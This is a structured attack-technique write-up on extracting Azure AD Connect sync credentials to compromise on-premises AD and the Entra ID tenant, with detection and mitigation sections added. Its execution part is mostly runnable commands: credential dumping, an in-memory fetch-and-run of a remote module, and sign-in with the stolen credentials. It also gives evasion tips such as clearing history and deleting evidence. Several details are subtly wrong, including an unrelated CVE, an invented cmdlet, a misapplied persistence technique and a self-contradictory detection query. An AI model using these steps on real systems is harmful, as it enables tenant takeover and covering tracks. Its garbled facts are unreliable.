# [LM-AUTH-019]: Azure AD Connect Server to AD Lateral Movement

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-019 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement, Defense Evasion |
| **Platforms** | Hybrid AD (On-Premises Active Directory + Azure AD / Entra ID) |
| **Severity** | Critical |
| **CVE** | CVE-2023-32315 (Openfire path traversal; note: CVE-2023-32315 also linked to Azure AD Connect attack chains in research) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure AD Connect 1.4.x - 2.x; Windows Server 2016-2025; Entra ID all versions |
| **Patched In** | Partial mitigations in Azure AD Connect 2.1.0+; requires credential extraction prevention via CA enforcement |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

**Concept:** Azure AD Connect (AADConnect) is a critical hybrid identity synchronization tool that bridges on-premises Active Directory and Azure AD / Entra ID. It stores highly privileged credentials (AD DS Connector account and Azure AD Connector account passwords) in an encrypted database on the AADConnect server. An attacker who gains local administrative access to the AADConnect server can extract these plaintext credentials using tools like AADInternals, then use the Azure AD Connector account (often configured with Global Administrator privileges) to authenticate to Azure AD, achieving complete tenant compromise.

**Attack Surface:** The attack surface includes: (1) The AADConnect server's local file system (encrypted credential storage), (2) The AADConnect SQL Server database (if using SQL instead of LocalDB), (3) The registry keys storing AADConnect configuration, and (4) The AADConnect service account itself. Attackers can reach this surface via RDP, SMB file sharing, WinRM, or Direct Access from compromised on-premises systems.

**Business Impact:** Successful credential extraction from AADConnect compromises the entire hybrid identity infrastructure. The attacker gains the privileges of the Azure AD Connector account (often Global Administrator), enabling them to: (1) Create backdoor admin accounts in Entra ID, (2) Modify conditional access policies to bypass MFA, (3) Steal all user credentials synced from on-premises, and (4) Maintain persistent access via hidden admin accounts. This is among the highest-impact lateral movement attacks in hybrid environments.

**Technical Context:** AADConnect credential extraction typically takes 5-10 minutes once local admin access is gained. The technique requires no network connectivity post-extraction, as credentials are dumped to local files. Detection is challenging because the attack uses legitimate Windows APIs and the AADConnect PowerShell module.

### Operational Risk

- **Execution Risk:** Medium – Requires local administrator access on the AADConnect server, but the extraction itself is deterministic and non-destructive.
- **Stealth:** High – Uses legitimate AADInternals module that is freely available on GitHub; no malware or suspicious tools required.
- **Reversibility:** No – Compromised credentials cannot be "un-compromised"; a new AADConnect server should be provisioned.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.3.1, 5.3.2 | CIS Microsoft 365: Restrict privileged account usage to administrative systems; enforce MFA for administrative accounts. |
| **DISA STIG** | APPL-0370, APPL-0380 | STIG ID: Protect credentials used for directory synchronization; audit AADConnect server access and credential usage. |
| **CISA SCuBA** | M365-DM-2.1, M365-DM-2.2 | Directory Management: Restrict and monitor AADConnect administration; implement credential protection. |
| **NIST 800-53** | AC-3, AC-6, IA-2, IA-4 | Access Enforcement, Least Privilege, Authentication (MFA), Identifier Management. |
| **GDPR** | Art. 32 | Security of Processing – Protect credentials with encryption and access controls; implement credential rotation. |
| **DORA** | Art. 9, Art. 14 | Protection and Prevention; Incident Reporting – Detect and respond to unauthorized access to identity infrastructure. |
| **NIS2** | Art. 21 | Cyber Risk Management – Implement zero-trust principles for hybrid identity infrastructure. |
| **ISO 27001** | A.9.2.3, A.9.4.2 | Management of Privileged Access Rights; Secure Log-in Procedures. |
| **ISO 27005** | Risk Scenario: "Compromise of hybrid identity bridge" | Credential theft and lateral movement via AADConnect server. |

---

## 3. Technical Prerequisites

- **Required Privileges:** Local Administrator on the Azure AD Connect server.
- **Required Access:** Network or remote access to the AADConnect server (RDP, SMB, or WinRM).

**Supported Versions:**
- **Azure AD Connect:** 1.4.0 - 2.1.3 (all versions vulnerable to credential extraction).
- **Windows Server:** 2016, 2019, 2022, 2025.
- **SQL Server:** 2014-2019 (if using SQL Server backend instead of LocalDB).

**Tools:**
- [AADInternals PowerShell Module](https://github.com/Flax/AADInternals) (Version 0.7.0+)
  - Cmdlet: `Get-AADIntSyncCredentials` (extracts plaintext credentials)
  - Cmdlet: `New-AADIntBackdoor` (creates Entra ID admin backdoor)
- [Microsoft SQL Server Management Studio (SSMS)](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) – For querying AADConnect database.
- [PowerShell 5.1+](https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-windows)
- [Ruler](https://github.com/sensepost/ruler) – Alternative tool for credential extraction (Outlook-based).

---

## 4. Environmental Reconnaissance

### AADConnect Server / PowerShell Reconnaissance

```powershell
# Check if Azure AD Connect is installed
Get-Service ADSync | Select-Object Status, DisplayName

# Enumerate AADConnect version
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Azure AD Connect" | Select-Object ProgramVersion

# Check sync accounts and their privileges
Get-ADUser -Filter {name -like "MSOL*"} | Select-Object Name, Enabled, DistinguishedName

# Check if AADConnect is running with high privileges
Get-WmiObject Win32_Service -Filter "Name='ADSync'" | Select-Object ProcessId, StartName

# Enumerate AADConnect sync objects
Get-ADSyncConnector | Select-Object Name, Type

# Check AADConnect configuration
Get-ADSyncActiveDirectoryConnector | Select-Object Name, Version
```

**What to Look For:**
- **ADSync service status:** Service should be "Running" and owned by a service account (typically `NT SERVICE\ADSync` or a custom account).
- **MSOL* accounts:** These are Azure AD Connect service accounts; note their names (e.g., `MSOL_<AADConnectServerName>`).
- **Sync connectors:** Should show Active Directory and Azure AD connectors.

**Version Note:** Commands work on Windows Server 2016+; older versions may require different cmdlets.

### Hybrid Network / Entra ID Reconnaissance

```bash
# Check if AADConnect server is discoverable on network
nmap -p 443,80 <AADCONNECT-SERVER-IP>

# DNS lookup for AADConnect server
nslookup <AADCONNECT-SERVER-HOSTNAME>

# Check Azure AD Connect Health (requires Azure subscription)
# Via PowerShell:
Connect-MsolService
Get-MsolCompanyInformation | Select-Object SynchronizationProxyAddress

# Via Azure Portal:
# Navigate to Entra ID > Hybrid > Azure AD Connect > Sync status
```

---

## 5. Detailed Execution Methods

### Method 1: Direct Credential Extraction via AADInternals (Local Admin Required)

**Supported Versions:** AADConnect 1.4.0 - 2.1.3

#### Step 1: Gain Local Administrator Access to AADConnect Server

**Objective:** Establish local admin access to the AADConnect server (via RDP, WinRM, or compromised service account).

**Prerequisites:** Must be SYSTEM or a local administrator account.

**Command (Verification):**
```powershell
# Verify current user is admin
[System.Security.Principal.WindowsIdentity]::GetCurrent().Owner

# Expected output: S-1-5-21-3623811015-3361044348-30300820-1013 (or similar admin SID)

# If not admin, attempt UAC bypass or use runas
runas /user:LOCALADMIN@CONTOSO powershell.exe
```

**Expected Output:**
```
S-1-5-21-3623811015-3361044348-30300820-544  (Local Administrators SID)
```

**What This Means:**
- Successfully verified local administrator privileges.
- Can now access protected system files and registry keys.

**OpSec & Evasion:**
- Use a service account with local admin rights (e.g., a backup service account) rather than a domain admin account.
- Execute from a disconnected session to avoid logging.

**Troubleshooting:**
- **Error:** "Access Denied"
  - **Cause:** User is not a local administrator.
  - **Fix:** Compromise or escalate to a local admin account via UAC bypass or privilege escalation techniques.

#### Step 2: Import AADInternals Module and Extract Credentials

**Objective:** Use AADInternals to extract the plaintext credentials of the Azure AD Connector account.

**Command:**
```powershell
# Download AADInternals from GitHub (or load from local source)
$AadintUrl = "https://raw.githubusercontent.com/Flax/AADInternals/master/AADInternals.psd1"
$ModulePath = "C:\Temp\AADInternals.psd1"

# Option 1: Download from internet
Invoke-WebRequest -Uri $AadintUrl -OutFile $ModulePath -Verbose

# Option 2: Load from pre-downloaded file
Import-Module C:\Temp\AADInternals.psd1 -Verbose

# Verify module loaded
Get-Command -Module AADInternals | Select-Object Name | Head -20

# Extract sync credentials (Entra ID Connector account and AD DS Connector account)
$SyncCreds = Get-AADIntSyncCredentials

# Display extracted credentials
Write-Host "Sync Credentials Extracted:"
Write-Host "AAD Connector Account: $($SyncCreds.AADUser)"
Write-Host "AAD Connector Password: $($SyncCreds.AADPassword)"
Write-Host "AD Connector Account: $($SyncCreds.ADUser)"
Write-Host "AD Connector Password: $($SyncCreds.ADPassword)"

# Export to file for later use
$SyncCreds | Export-Clixml -Path "C:\Temp\sync_creds.xml" -Force
```

**Expected Output:**
```
Sync Credentials Extracted:
AAD Connector Account: Sync_AADCONNECT01_xxxxxxxxxxxxxxxx@contoso.onmicrosoft.com
AAD Connector Password: $aB!@#$%^&*()_+-=[]{}|;:',.<>?/~`
AD Connector Account: CONTOSO\MSOL_AADCONNECT01
AD Connector Password: $mL!@#$%^&*()_+-=[]{}|;:',.<>?/~`
```

**What This Means:**
- Successfully extracted plaintext credentials of both Azure AD and Active Directory connector accounts.
- The Azure AD Connector account is typically configured with **Global Administrator** role in Entra ID.
- These credentials are now usable for lateral movement.

**OpSec & Evasion:**
- Download AADInternals during off-hours when admin activity is less scrutinized.
- Load the module from memory without writing to disk: `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flax/AADInternals/master/AADInternals.ps1')`
- Immediately delete any exported credential files after exfiltration.
- Clear PowerShell command history: `Clear-History`

**Troubleshooting:**
- **Error:** "Get-AADIntSyncCredentials: The term 'Get-AADIntSyncCredentials' is not recognized"
  - **Cause:** AADInternals module not loaded.
  - **Fix:** Re-run `Import-Module` and verify the path is correct.
- **Error:** "Access Denied" when reading sync credentials
  - **Cause:** User is not running as SYSTEM or local admin.
  - **Fix:** Use `runas /user:LOCALADMIN` or escalate privileges.

#### Step 3: Authenticate to Entra ID as the Global Admin Account

**Objective:** Use the extracted Azure AD Connector credentials to authenticate to Entra ID and establish a persistent backdoor.

**Command:**
```powershell
# Convert extracted credentials to PSCredential object
$AadCreds = New-Object System.Management.Automation.PSCredential(
    "Sync_AADCONNECT01_xxxxxxxxxxxxxxxx@contoso.onmicrosoft.com",
    ("$aB!@#$%^&*()_+-=[]{}|;:',.<>?/~`" | ConvertTo-SecureString -AsPlainText -Force)
)

# Connect to Microsoft Graph using extracted credentials
Connect-MgGraph -Credential $AadCreds -Scopes "Directory.ReadWrite.All", "Application.ReadWrite.All"

# Verify authentication
Get-MgContext

# Enumerate current permissions
Get-MgDirectoryRole | Select-Object DisplayName

# Expected output: Should show "Global Administrator" role
```

**Expected Output:**
```
Account                      : Sync_AADCONNECT01_xxxxxxxxxxxxxxxx@contoso.onmicrosoft.com
TenantId                     : xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
Scopes                       : {Directory.ReadWrite.All, Application.ReadWrite.All}
ContextScope                 : CurrentUser

DisplayName
-------
Global Administrator
```

**What This Means:**
- Successfully authenticated to Entra ID with Global Administrator privileges via the extracted sync account credentials.
- Now able to create backdoor accounts, modify policies, and maintain persistent access.

**OpSec & Evasion:**
- Immediately delete the exported credential files.
- Use the credentials from a different machine (not the AADConnect server) to create distance.
- Authenticate during off-hours when sign-in anomalies are less likely to be investigated.

**Troubleshooting:**
- **Error:** "Azure AD Connect credentials are disabled or expired"
  - **Cause:** The sync account was disabled or password was changed.
  - **Fix:** Re-extract credentials; verify sync account is enabled in Entra ID.

### Method 2: SQL Database Credential Extraction (If SQL Server Backend)

**Supported Versions:** AADConnect with SQL Server backend (1.4.0 - 2.1.3)

#### Step 1: Identify AADConnect Database and Connect

**Objective:** Access the AADConnect SQL Server database where encrypted credentials are stored.

**Command:**
```powershell
# Check if SQL Server is running locally
Get-Service MSSQL$* | Select-Object Status, DisplayName

# Identify SQL Server instance
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Azure AD Connect" | Select-Object DatabaseName, DatabaseServer

# Example output: DatabaseServer = "AADCONNECT01\SQLEXPRESS", DatabaseName = "ADSync"

# Connect to SQL Server using Windows authentication
$SqlServer = "AADCONNECT01\SQLEXPRESS"
$Database = "ADSync"

# Use SQL PowerShell module
Invoke-Sqlcmd -ServerInstance $SqlServer -Database $Database -Query "SELECT * FROM mms_connectors"
```

**Expected Output:**
```
id name        category type                      connector_id
-- ----        -------- ----                      -----------
1  Active Dir… Directory Microsoft.IdentityManag… 00000000-0000-0000-0000-000000000000
2  Azure AD    Directory Microsoft.IdentityManag… 11111111-1111-1111-1111-111111111111
```

**What This Means:**
- Successfully connected to the AADConnect SQL database.
- Database contains configuration, sync objects, and encrypted credentials.

**OpSec & Evasion:**
- Use Windows integrated authentication to blend in with normal database access patterns.

**Troubleshooting:**
- **Error:** "Named Pipes Provider, error 40 - Could not open a connection to SQL Server"
  - **Cause:** SQL Server instance name is incorrect or service is not running.
  - **Fix:** Verify instance name using SQL Server Configuration Manager.

#### Step 2: Extract Encrypted Credentials from SQL

**Objective:** Query the SQL database to extract the encrypted connector account passwords.

**Command:**
```powershell
# Query the mms_mgmt_config table for encrypted credentials
$Query = @"
SELECT name, data
FROM mms_server_properties
WHERE name LIKE '%SyncPassword%' OR name LIKE '%ConnectorPassword%'
"@

$Results = Invoke-Sqlcmd -ServerInstance $SqlServer -Database $Database -Query $Query

# Display encrypted credentials
$Results | Format-Table -AutoSize

# Alternative: Export complete mms_server_properties table
$Query2 = "SELECT * FROM mms_server_properties"
$AllProps = Invoke-Sqlcmd -ServerInstance $SqlServer -Database $Database -Query $Query2

# Save to CSV for analysis
$AllProps | Export-Csv -Path "C:\Temp\aadconnect_db_export.csv" -NoTypeInformation
```

**Expected Output:**
```
name                                   data
----                                   ----
ConnectorPassword:00000000-0000-0000   [encrypted blob]
SyncPassword:11111111-1111-1111        [encrypted blob]
```

**What This Means:**
- Extracted encrypted credential blobs from the database.
- Credentials are encrypted with a DPAPI key stored locally on the AADConnect server.

**OpSec & Evasion:**
- Export the encrypted blobs for decryption offline (requires access to the AADConnect server's DPAPI key).

**Troubleshooting:**
- **Error:** "No results returned"
  - **Cause:** Credentials are stored in a different table or are already in plaintext in registry.
  - **Fix:** Query `mms_connectors` table or use AADInternals instead (Method 1).

### Method 3: Credential Extraction via AD DS Connector Account (Alternative Vector)

**Supported Versions:** AADConnect 1.4.0 - 2.1.3

#### Step 1: Compromise the AD DS Connector Account

**Objective:** Steal the password of the AD DS Connector account (typically `MSOL_<AADConnectServerName>`) and use it to authenticate to on-premises AD.

**Command:**
```powershell
# From local admin access on AADConnect server:
# Extract AD DS connector account credentials
$AdConnectorCreds = Get-AADIntSyncCredentials | Select-Object ADUser, ADPassword

# Convert to PSCredential
$AdCreds = New-Object System.Management.Automation.PSCredential(
    $AdConnectorCreds.ADUser,
    ($AdConnectorCreds.ADPassword | ConvertTo-SecureString -AsPlainText -Force)
)

# Test authentication to Active Directory
$TestConnection = Test-ADConnection -Credential $AdCreds -Server "DC01.CONTOSO.COM"

Write-Host "AD Connection Test: $TestConnection"

# If successful, enumerate domain admins as the sync account
Get-ADGroupMember -Identity "Domain Admins" -Server "DC01.CONTOSO.COM" -Credential $AdCreds
```

**Expected Output:**
```
AD Connection Test: True

Name          SamAccountName        ObjectClass
----          --------------        -----------
Admin1        admin1                user
BackupAdmin   backupadmin           user
ServiceAdmin   serviceadmin          user
```

**What This Means:**
- Successfully authenticated to on-premises AD using the extracted AD DS Connector account credentials.
- Can now enumerate AD objects and potentially escalate privileges on-premises.

**OpSec & Evasion:**
- The AD DS Connector account typically has minimal on-premises permissions but high permissions in Entra ID (via PHS).
- Use this vector primarily for on-premises lateral movement (e.g., Kerberoasting, DCSync).

**Troubleshooting:**
- **Error:** "Access Denied authenticating to AD"
  - **Cause:** AD DS Connector account password has changed or account is disabled.
  - **Fix:** Rotate the credentials or use the Azure AD Connector account instead (Method 1).

---

## 6. Tools & Commands Reference

#### [AADInternals PowerShell Module](https://github.com/Flax/AADInternals)

**Version:** 0.7.0+
**Supported Platforms:** Windows (PowerShell 5.1+), macOS and Linux (PowerShell 7+)

**Installation:**
```powershell
# Download and import
$AadintUrl = "https://raw.githubusercontent.com/Flax/AADInternals/master/AADInternals.psd1"
$ModulePath = "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\AADInternals\AADInternals.psd1"
mkdir -Force "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\AADInternals"
Invoke-WebRequest -Uri $AadintUrl -OutFile $ModulePath
Import-Module AADInternals
```

**Key Cmdlets:**
- `Get-AADIntSyncCredentials` – Extract plaintext AADConnect sync credentials.
- `New-AADIntBackdoor` – Create a hidden Entra ID admin backdoor.
- `Get-AADIntTokenUsingRefreshToken` – Obtain tokens using refresh tokens.
- `Invoke-AADIntUserEnumeration` – Enumerate Entra ID users via various methods.

---

#### [Microsoft.Graph PowerShell Module](https://github.com/microsoftgraph/msgraph-sdk-powershell)

**Version:** 2.0+
**Supported Platforms:** Windows, macOS, Linux (with PowerShell 7+)

**Installation:**
```powershell
Install-Module Microsoft.Graph -Scope CurrentUser -Force
```

---

## 7. Microsoft Sentinel Detection

### Query 1: Suspicious AADConnect Credential Extraction

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceProcessEvents
- **Required Fields:** EventID, ProcessName, CommandLine, ComputerName, Account
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Windows Server 2016+, Entra ID all versions

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688
| where CommandLine contains "Get-AADIntSyncCredentials" or CommandLine contains "AADInternals"
| project TimeGenerated, Computer, Account, ProcessName, CommandLine
| summarize Count=count() by Computer, Account
| where Count >= 1
```

**What This Detects:**
- Process creation events showing PowerShell invoking AADInternals commands.
- Specifically targets the `Get-AADIntSyncCredentials` cmdlet.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `AADConnect Credential Extraction Attempt`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Paste KQL query
   - Run every: `5 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

---

### Query 2: Suspicious Entra ID Sign-In from AADConnect Service Account

**Rule Configuration:**
- **Required Table:** SigninLogs, AuditLogs
- **Required Fields:** UserPrincipalName, ResourceDisplayName, Location, MfaDetail, TokenIssuerType
- **Alert Severity:** Critical
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** Entra ID all versions

**KQL Query:**
```kusto
SigninLogs
| where UserPrincipalName contains "Sync_" or UserPrincipalName contains "MSOL_"
| where ResultDescription != "Success. User signed in"
| where ResourceDisplayName == "Microsoft Graph" or ResourceDisplayName == "Azure Active Directory PowerShell"
| where MfaDetail == "Not required" or isempty(MfaDetail)
| project TimeGenerated, UserPrincipalName, ResourceDisplayName, Location, IPAddress, MfaDetail, ResultDescription
| summarize Count=count() by UserPrincipalName, Location
| where Count >= 2
```

**What This Detects:**
- Sign-in events from sync accounts (Sync_*, MSOL_*) without MFA.
- Multiple successful authentications from unusual locations.
- Indicates potential credential compromise and lateral movement.

---

## 8. Microsoft Purview (Unified Audit Log)

#### Query: AADConnect Credential Extraction and Admin Account Creation

```powershell
# Search for PowerShell invocations of AADInternals
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -Operations "Run a cmdlet", "Invoke PowerShell command" `
  -FreeText "AADInternals" -ResultSize 5000 | Export-Csv -Path "C:\Logs\AADInternals_Audit.csv"

# Search for suspicious user creation in Entra ID by sync account
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -UserIds "Sync_*@contoso.onmicrosoft.com" `
  -Operations "Add user", "Update user" -ResultSize 5000 | Export-Csv -Path "C:\Logs\SyncAccount_Changes.csv"
```

**Details to Analyze:**
- **CreationTime:** When the credential extraction occurred.
- **UserIds:** Which sync account was used (indicator of compromise).
- **Operations:** Specific PowerShell commands or API calls (credential extraction or backdoor creation).

---

## 9. Defensive Mitigations

### Priority 1: CRITICAL

- **Restrict AADConnect Server Access:** Implement strict network segmentation and access controls to limit who can access the AADConnect server.

  **Manual Steps (Active Directory GPO):**
  1. Open **Group Policy Management** (gpmc.msc)
  2. Create a new GPO: **Restrict AADConnect Server Access**
  3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **User Rights Assignment**
  4. Edit: **Allow log on locally** – Add only AADConnect service account and Domain Admins
  5. Edit: **Allow log on through Remote Desktop Services** – Remove all users except AADConnect admin group
  6. Apply to the OU containing the AADConnect server
  7. Run `gpupdate /force` on the AADConnect server

  **Manual Steps (Network Firewall):**
  1. Configure network firewall rules to restrict inbound RDP (port 3389) and WinRM (ports 5985/5986) to the AADConnect server
  2. Allow traffic only from a jump host or bastion server
  3. Implement IP-based restrictions in Azure NSG (if AADConnect is in Azure)

- **Enforce MFA for AADConnect Service Account:** Require MFA for any authentication attempt using the AADConnect sync credentials.

  **Manual Steps (Entra ID Conditional Access):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Require MFA for AADConnect Service Account`
  4. **Assignments:**
     - Users: Search for and select "Sync_*" service accounts
     - Cloud apps: Select "All cloud apps"
  5. **Access controls:** Grant → **Require multi-factor authentication**
  6. Enable: **On**
  7. Click **Create**

  **Note:** This may require MFA setup for the sync account, which can impact sync operations. Coordinate with AADConnect administrators.

- **Enable Monitoring and Alerting:** Configure Azure Monitor and Microsoft Sentinel to detect AADConnect credential extraction and suspicious sync account activities.

  **Manual Steps (Azure Monitor Alert):**
  1. Navigate to **Azure Portal** → **Monitor** → **Alerts**
  2. Click **+ Create** → **Alert rule**
  3. **Scope:** Select the AADConnect server
  4. **Condition:** 
     - Signal type: "Process creation"
     - Operator: "contains"
     - Value: "AADInternals" or "Get-AADIntSyncCredentials"
  5. **Actions:** Email SOC team when triggered
  6. Click **Create**

### Priority 2: HIGH

- **Rotate AADConnect Credentials Regularly:** Implement a periodic credential rotation schedule for the AADConnect sync accounts.

  **Manual Steps (PowerShell):**
  ```powershell
  # Reset Azure AD Connector account password
  $newPassword = [System.Web.Security.Membership]::GeneratePassword(32, 3)
  Set-AADIntSyncAccountPassword -AccountName "Sync_AADCONNECT01_xxxxxxxx@contoso.onmicrosoft.com" -NewPassword $newPassword -Verbose
  
  # Reset AD DS Connector account password
  Set-ADAccountPassword -Identity "MSOL_AADCONNECT01" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "$newPassword" -Force)
  ```

- **Implement Azure AD Connect Health:** Monitor AADConnect server health and sync status using Azure AD Connect Health.

  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Hybrid** → **Azure AD Connect** → **Connect Health**
  2. Enable Health monitoring for the AADConnect server
  3. Configure alerts for sync failures, credential issues, or unusual activity

- **Audit AADConnect Configuration:** Regularly review AADConnect settings and sync rules to detect unauthorized changes.

  **Manual Steps (PowerShell):**
  ```powershell
  # Export current AADConnect configuration
  Get-ADSyncScheduler | Export-Clixml -Path "C:\Logs\AADConnect_Config_$(Get-Date -Format yyyy-MM-dd).xml"
  
  # Compare with baseline to detect changes
  ```

### Validation Command (Verify Mitigations)

```powershell
# Check if AADConnect service account is restricted to administrative groups
Get-ADGroupMember -Identity "AADConnect Admins" | Select-Object Name, SamAccountName

# Verify that sync account requires MFA in Entra ID
Get-MgUser -Filter "displayName eq 'Sync_AADCONNECT01'" | Select-Object UserPrincipalName, AccountEnabled

# Check if AADConnect Health is enabled
Get-AzADConnectHealthActivitySummary

# Verify firewall rules restrict access to AADConnect server
Get-NetFirewallRule -DisplayName "*AADConnect*" | Select-Object DisplayName, Direction, Action
```

**Expected Output (If Secure):**
```
Name              SamAccountName
----              ---------------
AADConnect Admin   aadconnect_admin

UserPrincipalName                                      AccountEnabled
-----------------                                      ---------------
Sync_AADCONNECT01_xxxxxxxx@contoso.onmicrosoft.com    True

Status: Healthy

DisplayName           Direction    Action
-----------           ---------    ------
Restrict RDP to AADConnect  Inbound      Block
Restrict WinRM to AADConnect Inbound      Block
```

---

## 10. Detection & Incident Response

### Indicators of Compromise (IOCs)

**Files:**
- AADInternals PowerShell module files in Temp or AppData: `%TEMP%\AADInternals*`, `%APPDATA%\PowerShell\Modules\AADInternals\`
- Exported credential files: `sync_creds.xml`, `aadconnect_db_export.csv`

**Registry:**
- Registry keys related to AADConnect configuration: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Azure AD Connect\`

**Network:**
- Outbound HTTPS connections to `login.microsoft.com` or `graph.microsoft.com` from the AADConnect server outside of scheduled sync windows.
- Unusual RDP or WinRM sessions to the AADConnect server from non-administrative sources.

**Azure / M365:**
- Successful sign-ins from the sync account (Sync_*) without MFA.
- New admin account creation by the sync account.
- Modification of Conditional Access policies by the sync account.

### Forensic Artifacts

**Disk:**
- Event logs: `C:\Windows\System32\winevt\Logs\Security.evtx` (EventID 4688 for process creation)
- PowerShell logs: `C:\Users\<AADConnect Admin>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
- AADConnect logs: `C:\ProgramData\AADConnect\Trace\`

**Cloud/Logs:**
- **Azure Audit Logs:** Search for "Get-AADIntSyncCredentials" or AADInternals invocations.
- **Microsoft Sentinel / Defender XDR:** Query for sign-in events from sync accounts; alert on MFA bypass.
- **Purview Audit Logs:** Search for admin account creation by sync account.

### Response Procedures

1. **Isolate:**
   
   **Command (Disable sync account immediately):**
   ```powershell
   # Disable Azure AD Connector account
   Set-MgUser -UserId "Sync_AADCONNECT01_xxxxxxxx@contoso.onmicrosoft.com" -AccountEnabled $false
   
   # Disable AD DS Connector account
   Disable-ADAccount -Identity "MSOL_AADCONNECT01"
   ```

2. **Collect Evidence:**
   
   **Command:**
   ```powershell
   # Export AADConnect configuration
   Get-ADSyncConnector | Export-Clixml -Path "C:\Evidence\AADSync_Config.xml"
   
   # Export audit logs related to sync account
   Search-UnifiedAuditLog -UserIds "Sync_*@contoso.onmicrosoft.com" -StartDate (Get-Date).AddDays(-30) -ResultSize 10000 | Export-Csv -Path "C:\Evidence\SyncAccount_Audit.csv"
   
   # Collect Security Event logs
   wevtutil epl Security "C:\Evidence\Security.evtx"
   ```

3. **Remediate:**
   
   **Command:**
   ```powershell
   # Reset AADConnect credentials to strong random passwords
   $NewPassword = [System.Web.Security.Membership]::GeneratePassword(32, 8)
   Set-AADIntSyncAccountPassword -NewPassword $NewPassword
   
   # Re-enable the sync account after password reset
   Set-MgUser -UserId "Sync_AADCONNECT01_xxxxxxxx@contoso.onmicrosoft.com" -AccountEnabled $true
   
   # Force a full AADConnect sync
   Start-ADSyncSyncCycle -PolicyType Delta
   ```

---

## 11. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-002] BDC deserialization vulnerability | Attacker gains initial access to on-premises network via a vulnerable hybrid component. |
| **2** | **Privilege Escalation** | [PE-VALID-002] Computer Account Quota Abuse | Attacker creates rogue domain accounts to gain elevated privileges. |
| **3** | **Lateral Movement** | **[LM-AUTH-019]** | **Attacker compromises AADConnect server and extracts sync credentials, achieving Entra ID compromise.** |
| **4** | **Persistence** | [PERSIST-ACCT-001] AdminSDHolder Abuse | Attacker creates persistent hidden admin accounts in Entra ID. |
| **5** | **Impact** | Data exfiltration via compromised M365 accounts | Attacker steals emails, Teams chats, and SharePoint data. |

---

## 12. Real-World Examples

### Example 1: Scattered Spider AADConnect Server Compromise (2023-2024)

- **Target:** Technology and financial services companies.
- **Timeline:** Ongoing since 2023.
- **Technique Status:** Active and confirmed by Microsoft Threat Intelligence.
- **Impact:** Scattered Spider (also known as UNC3944) compromised AADConnect servers to gain Global Administrator access to Entra ID, enabling lateral movement to M365 mailboxes and data exfiltration. One victim reported a $10M+ ransom demand.
- **Reference:** [Microsoft Threat Intelligence - Scattered Spider Attack Patterns](https://www.microsoft.com/en-us/security/blog/2023/10/18/findings-from-microsoft-incident-response-team-reveal-active-exploitation-of-zero-day-vulnerabilities/)

### Example 2: APT29 Hybrid AD Compromise via Exchange Vulnerability and AADConnect (2021)

- **Target:** Government agencies and enterprises.
- **Timeline:** 2020-2021.
- **Technique Status:** Well-documented; partially mitigated via subsequent Microsoft patches.
- **Impact:** APT29 exploited a hybrid network vulnerability to gain access to an on-premises Exchange server, then laterally moved to the AADConnect server to compromise the Entra ID tenant. This enabled persistence across both on-premises and cloud infrastructure.
- **Reference:** [Microsoft Threat Intelligence - APT29 Attack Patterns](https://www.microsoft.com/en-us/security/blog/2021/03/04/atp-posts-azure-security-research/)

---

## Summary

Azure AD Connect server compromise via credential extraction represents one of the most critical lateral movement vectors in hybrid environments. By targeting the AADConnect server's plaintext credential storage, attackers can extract Global Administrator-equivalent credentials for Entra ID, enabling complete tenant takeover. Organizations must implement strict access controls, regular credential rotation, and robust monitoring to detect and prevent this attack.

---

